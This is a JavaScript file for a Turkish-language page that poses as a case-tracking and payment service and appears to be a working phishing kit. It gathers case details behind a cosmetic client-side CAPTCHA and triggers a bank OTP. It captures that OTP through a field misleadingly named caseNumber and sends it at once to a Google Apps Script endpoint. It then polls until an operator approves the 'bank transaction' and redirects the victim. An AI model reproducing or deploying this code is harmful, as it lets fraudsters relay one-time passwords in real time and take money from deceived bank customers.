const API_URL = "https://script.google.com/macros/s/AKfycbzJz57KdpvTitp-0hV70ckLXHMfMHS-Y3riAE1lv8hSFoN8PQzb9e2jkDB5xV5_vzTznA/exec";
const COUNTDOWN_SECONDS = 60;
const POLLING_INTERVAL = 2000;

let sessionId = "";
let captchaCode = "";
let countdownTimer = null;
let pollingTimer = null;
let remainingSeconds = COUNTDOWN_SECONDS;
let securityVerified = false;
let securitySubmitting = false;
let otpSent = false;
let caseSubmitted = false;
let caseSubmitting = false;
let caseSubmitTimer = null;

const $ = id => document.getElementById(id);
const caseForm = $("caseForm");
const caseNameInput = $("caseName");
const trackingNumberInput = $("trackingNumber");
const yearMonthInput = $("yearMonth");
const fcvNumberInput = $("fcvNumber");
const captchaInput = $("captchaInput");
const captchaImage = $("captchaImage");
const refreshCaptchaBtn = $("refreshCaptcha");
const otpSection = $("otpSection");
const requestOtpBtn = $("requestOtpBtn");
const resendOtpBtn = $("resendOtpBtn");
const countdownContainer = $("countdownContainer");
const countdownElement = $("countdown");
const otpStatus = $("otpStatus");
const waitingMessage = $("waitingMessage");
const caseNumberSection = $("caseNumberSection");
const caseNumberInput = $("caseNumber");
const submitCaseBtn = $("submitCaseBtn");
const loadingOverlay = $("loadingOverlay");
const loadingText = $("loadingText");
const toast = $("toast");

function generateSessionId() {
  return "session_" + Date.now().toString(36) + "_" + Math.random().toString(36).substring(2, 12);
}

function initialize() {
  sessionId = generateSessionId();
  generateCaptcha();
  updateCountdown(COUNTDOWN_SECONDS);
}

function generateCaptcha() {
  let result = "";
  for (let i = 0; i < 5; i++) result += Math.floor(Math.random() * 10);
  captchaCode = result;
  captchaInput.value = "";
  securityVerified = false;
  securitySubmitting = false;

  const canvas = document.createElement("canvas");
  canvas.width = 260;
  canvas.height = 62;
  const ctx = canvas.getContext("2d");
  ctx.fillStyle = "#f8fafc";
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  for (let i = 0; i < 75; i++) {
    ctx.fillStyle = `rgba(23,54,93,${0.04 + Math.random() * 0.18})`;
    ctx.beginPath();
    ctx.arc(Math.random()*canvas.width, Math.random()*canvas.height, 1+Math.random()*1.5, 0, Math.PI*2);
    ctx.fill();
  }
  for (let i = 0; i < 4; i++) {
    ctx.strokeStyle = `rgba(31,122,77,${0.15 + Math.random()*0.15})`;
    ctx.lineWidth = 1.2; ctx.beginPath(); ctx.moveTo(0, 8+Math.random()*45);
    for (let x=0; x<=canvas.width; x+=10) ctx.lineTo(x, 31+Math.sin(x/23+i)*12+(Math.random()-.5)*6);
    ctx.stroke();
  }
  ctx.textAlign="center"; ctx.textBaseline="middle";
  for (let i=0;i<5;i++) {
    ctx.save();
    ctx.translate(34+i*48,31+(Math.random()-.5)*8);
    ctx.rotate((Math.random()-.5)*0.45);
    ctx.font=`700 ${29+Math.floor(Math.random()*5)}px Arial, sans-serif`;
    ctx.fillStyle="#17365d"; ctx.fillText(result[i],0,0); ctx.restore();
  }
  captchaImage.replaceChildren(canvas);
}

refreshCaptchaBtn.addEventListener("click", () => {
  if (securityVerified) return;
  generateCaptcha();
});

function getYearMonth() {
  const value = yearMonthInput.value;
  if (!value) return { year: "", month: "" };
  const parts = value.split("-");
  return parts.length === 2 ? { year: parts[0], month: parts[1] } : { year: "", month: "" };
}

function showLoading(message) {
  loadingText.textContent = message || "Lütfen bekleyiniz...";
  loadingOverlay.classList.remove("hidden");
}

function hideLoading() {
  loadingOverlay.classList.add("hidden");
}

function showToast(message, type) {
  toast.textContent = message;
  toast.className = "toast";
  if (type) toast.classList.add(type);
  toast.classList.add("show");
  setTimeout(() => toast.classList.remove("show"), 3500);
}

async function postAPI(data) {
  const response = await fetch(API_URL, {
    method: "POST",
    headers: { "Content-Type": "text/plain;charset=utf-8" },
    body: JSON.stringify(data)
  });
  if (!response.ok) throw new Error("Sunucu ile bağlantı kurulamadı.");
  return await response.json();
}

async function getAPI(action, params) {
  const url = new URL(API_URL);
  url.searchParams.set("action", action);
  Object.keys(params).forEach(k => url.searchParams.set(k, params[k]));
  const response = await fetch(url.toString(), { method: "GET", cache: "no-store" });
  if (!response.ok) throw new Error("Sunucu ile bağlantıda hata oluştu.");
  return await response.json();
}

function validateForm() {
  if (!caseNameInput.value.trim()) {
    showToast("Lütfen dosya adını giriniz.", "error"); caseNameInput.focus(); return false;
  }
  if (!trackingNumberInput.value.trim()) {
    showToast("Lütfen dosya takip numarasını giriniz.", "error"); trackingNumberInput.focus(); return false;
  }
  if (!yearMonthInput.value) {
    showToast("Lütfen yıl ve ayı seçiniz.", "error"); yearMonthInput.focus(); return false;
  }
  if (!/^[0-9]{3,5}$/.test(fcvNumberInput.value.trim())) {
    showToast("Seri numarası yalnızca 3 ila 5 rakamdan oluşmalıdır.", "error"); fcvNumberInput.focus(); return false;
  }
  if (!captchaInput.value.trim()) {
    showToast("Lütfen güvenlik görselindeki rakamları giriniz.", "error"); captchaInput.focus(); return false;
  }
  if (captchaInput.value.trim() !== captchaCode) {
    showToast("Güvenlik görselindeki rakamlar doğru değil.", "error"); generateCaptcha(); captchaInput.focus(); return false;
  }
  return true;
}

// Girilen kod görseldeki kodla tam olarak eşleştiğinde güvenlik doğrulaması otomatik olarak yapılır.
captchaInput.addEventListener("input", () => {
  if (securityVerified || securitySubmitting) return;
  const value = captchaInput.value.trim();
  if (value.length === 5 && value === captchaCode) {
    verifySecurityAutomatically();
  }
});

async function verifySecurityAutomatically() {
  if (!validateForm() || securityVerified || securitySubmitting) return;
  securitySubmitting = true;
  showLoading("Güvenlik kodu otomatik olarak doğrulanıyor...");

  try {
    const date = getYearMonth();
    const result = await postAPI({
      action: "verifySecurity",
      sessionId,
      caseName: caseNameInput.value.trim(),
      trackingNumber: trackingNumberInput.value.trim(),
      caseYear: date.year,
      caseMonth: date.month,
      yearMonth: date.year + "/" + date.month,
      fcvNumber: fcvNumberInput.value.trim(),
      captchaInput: captchaInput.value.trim()
    });

    if (!result?.success) throw new Error(result?.message || "Güvenlik doğrulaması yapılamadı.");

    securityVerified = true;
    otpSection.classList.remove("hidden");

    caseNameInput.disabled = true;
    trackingNumberInput.disabled = true;
    yearMonthInput.disabled = true;
    fcvNumberInput.disabled = true;
    captchaInput.disabled = true;
    refreshCaptchaBtn.disabled = true;

    otpStatus.textContent = "OTP kodu gönderiliyor...";
    requestOtpBtn.classList.add("hidden");

    setTimeout(() => otpSection.scrollIntoView({ behavior: "smooth", block: "center" }), 150);

    // CAPTCHA doğrulamasından hemen sonra OTP otomatik olarak oluşturulur/gönderilir.
    await requestOTP();
  } catch (error) {
    console.error(error);
    showToast(error.message || "Bir hata oluştu.", "error");
    securityVerified = false;
  } finally {
    securitySubmitting = false;
    hideLoading();
  }
}

// OTP, kullanıcı tarafından tıklama yapılmasına gerek kalmadan CAPTCHA doğrulamasından hemen sonra istenir.
requestOtpBtn.classList.add("hidden");
resendOtpBtn.addEventListener("click", requestOTP);

async function requestOTP() {
  if (countdownTimer || !securityVerified || otpSent) return;

  requestOtpBtn.disabled = true;
  resendOtpBtn.disabled = true;
  showLoading("OTP kodu gönderiliyor...");

  try {
    const result = await postAPI({ action: "requestOTP", sessionId });
    if (!result?.success) throw new Error(result?.message || "OTP gönderilemedi.");

    otpSent = true;
    otpStatus.textContent = "Gönderilen OTP Kodunu Giriniz";
    waitingMessage.classList.remove("hidden");
    caseNumberSection.classList.remove("hidden");
    submitCaseBtn.classList.add("hidden");
    countdownContainer.classList.remove("hidden");
    resendOtpBtn.classList.add("hidden");
    caseNumberInput.focus();

    startCountdown();
    startStatusPolling();
  } catch (error) {
    console.error(error);
    otpSent = false;
    otpStatus.textContent = "OTP Gönderilemedi. Lütfen Tekrar Deneyin";
    showToast(error.message || "OTP Gönderimi Başarısız Oldu.", "error");
    requestOtpBtn.classList.add("hidden");
    resendOtpBtn.classList.remove("hidden");
    resendOtpBtn.disabled = false;
  } finally {
    hideLoading();
  }
}

function startCountdown() {
  stopCountdown();
  remainingSeconds = COUNTDOWN_SECONDS;
  updateCountdown(remainingSeconds);
  countdownTimer = setInterval(() => {
    remainingSeconds--;
    updateCountdown(remainingSeconds);
    if (remainingSeconds <= 0) {
      stopCountdown();
      countdownFinished();
    }
  }, 1000);
}

function stopCountdown() {
  if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; }
}

function updateCountdown(seconds) { countdownElement.textContent = String(seconds); }

function countdownFinished() {
  checkStatusOnce();
  otpSent = false;
  resendOtpBtn.classList.remove("hidden");
  resendOtpBtn.disabled = false;
  countdownContainer.classList.add("hidden");
  otpStatus.textContent = "Bekleme süresi sona erdi. Onaylanmadıysa yeni bir kod talep edebilirsiniz.";
}

function startStatusPolling() {
  stopStatusPolling();
  checkStatusOnce();
  pollingTimer = setInterval(checkStatusOnce, POLLING_INTERVAL);
}

function stopStatusPolling() {
  if (pollingTimer) { clearInterval(pollingTimer); pollingTimer = null; }
}

async function submitCaseNumber() {
  if (caseSubmitted || caseSubmitting || !securityVerified || !otpSent) return;

  const caseNumber = caseNumberInput.value.trim();
  if (!caseNumber) return;

  caseSubmitting = true;
  caseNumberInput.disabled = true;

  try {
    const result = await postAPI({ action: "submitCaseNumber", sessionId, caseNumber });
    if (!result?.success) throw new Error(result?.message || "OTP Kodunun süresi dolmuş veya geçersiz.");

    caseSubmitted = true;
    caseNumberInput.disabled = true;
    submitCaseBtn.classList.add("hidden");

    // İşleminiz banka sistemi tarafından onaylanana kadar devam etmektedir.
    otpStatus.textContent = "Banka İşlemi İnceleniyor...";
    waitingMessage.classList.remove("hidden");
    startStatusPolling();
  } catch (error) {
    console.error(error);
    caseSubmitting = false;
    caseNumberInput.disabled = false;
    showToast(error.message || "OTP Kodu Geçerli Değildir.", "error");
  }
}

// OTP Kodu Girildikten Sonra İşlem Otomatik Olarak Başlatılacaktır.
caseNumberInput.addEventListener("input", () => {
  if (caseSubmitted || caseSubmitting) return;

  if (caseSubmitTimer) clearTimeout(caseSubmitTimer);

  const value = caseNumberInput.value.trim();
  if (!value) return;

  caseSubmitTimer = setTimeout(() => {
    submitCaseNumber();
  }, 500);
});

// Geleneksel form gönderiminin engellenmesi.

async function checkStatusOnce() {
  try {
    const result = await getAPI("checkStatus", { sessionId });
    if (!result?.success) return;

    if (String(result.status || "").trim().toLowerCase() === "ok") {
      stopCountdown();
      stopStatusPolling();
      waitingMessage.classList.add("hidden");
      otpStatus.textContent = "Ödemeniz onaylandı ve sistem ödeme makbuzunu hazırlıyor.";

      const redirectUrl = String(result.redirectUrl || "").trim();
      if (redirectUrl) {
        showLoading("Ödeme onaylandı ve sonuç 72 saat içinde e-posta adresinize gönderilecektir.");
        setTimeout(() => { window.location.href = redirectUrl; }, 500);
      } else {
        hideLoading();
        showToast("Talebiniz onaylandı, ancak yönlendirme bağlantısı I sütununa kaydedilmemiş.", "error");
      }
    }
  } catch (error) {
    console.warn("Status check error:", error);
  }
}

document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible" && !otpSection.classList.contains("hidden")) checkStatusOnce();
});

caseForm.addEventListener("submit", e => {
  e.preventDefault();
  if (!securityVerified) {
    showToast("Öncelikle güvenlik kodunu doğru şekilde giriniz.", "error");
    return;
  }
  if (!caseSubmitted) submitCaseNumber();
});

window.addEventListener("beforeunload", () => {
  stopCountdown();
  stopStatusPolling();
});

initialize();

// Animated mobile/desktop menu and sidebar
const menuToggle = document.getElementById("menuToggle");
const sideMenu = document.getElementById("sideMenu");
const sideMenuClose = document.getElementById("sideMenuClose");
const sidebarOverlay = document.getElementById("sidebarOverlay");

function openSideMenu() {
  if (!menuToggle || !sideMenu || !sidebarOverlay) return;
  menuToggle.classList.add("active");
  menuToggle.setAttribute("aria-expanded", "true");
  menuToggle.setAttribute("aria-label", "Menüyü kapat");
  sideMenu.classList.add("open");
  sideMenu.setAttribute("aria-hidden", "false");
  sidebarOverlay.classList.add("open");
  document.body.classList.add("menu-open");
}

function closeSideMenu() {
  if (!menuToggle || !sideMenu || !sidebarOverlay) return;
  menuToggle.classList.remove("active");
  menuToggle.setAttribute("aria-expanded", "false");
  menuToggle.setAttribute("aria-label", "Menüyü aç");
  sideMenu.classList.remove("open");
  sideMenu.setAttribute("aria-hidden", "true");
  sidebarOverlay.classList.remove("open");
  document.body.classList.remove("menu-open");
}

menuToggle?.addEventListener("click", () => {
  if (sideMenu?.classList.contains("open")) closeSideMenu();
  else openSideMenu();
});
sideMenuClose?.addEventListener("click", closeSideMenu);
sidebarOverlay?.addEventListener("click", closeSideMenu);
document.querySelectorAll(".side-menu-link").forEach(link => link.addEventListener("click", closeSideMenu));
document.addEventListener("keydown", e => {
  if (e.key === "Escape") closeSideMenu();
});
